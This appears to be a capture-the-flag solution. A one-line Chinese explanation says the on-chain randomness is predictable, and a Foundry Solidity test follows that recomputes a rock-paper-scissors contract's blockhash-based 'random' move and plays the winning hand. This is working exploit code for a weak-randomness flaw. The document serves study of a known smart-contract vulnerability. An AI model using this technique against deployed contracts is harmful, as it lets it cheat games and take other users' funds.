随机数使用公开的链上数据，可以直接预测。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.20;

import "./utils/BaseTest.sol";
import "./utils/Utilities.sol";
import "src/Challenge.sol";

contract TestSolver is BaseTest {
    Challenge private challenge;

    enum Hand {
        Rock,
        Paper,
        Scissors
    }

    constructor() {
        challenge = new Challenge(player);
    }

    function randomShape() internal view returns (Hand) {
        return Hand(uint256(keccak256(abi.encodePacked(player, blockhash(block.number - 1)))) % 3);
    }

    function testSolve() public {
        vm.startPrank(player);

        RockPaperScissors rps = challenge.rps();

        Hand beat = randomShape();
        Hand my;
        if (beat == Hand.Scissors) {
            my = Hand.Rock;
        } else if (beat == Hand.Rock) {
            my = Hand.Paper;
        } else if (beat == Hand.Paper) {
            my = Hand.Scissors;
        }

        rps.tryToBeatMe(RockPaperScissors.Hand(uint256(my)));

        assertTrue(challenge.isSolved(), "Not solved.");
        vm.stopPrank();
    }
}
```



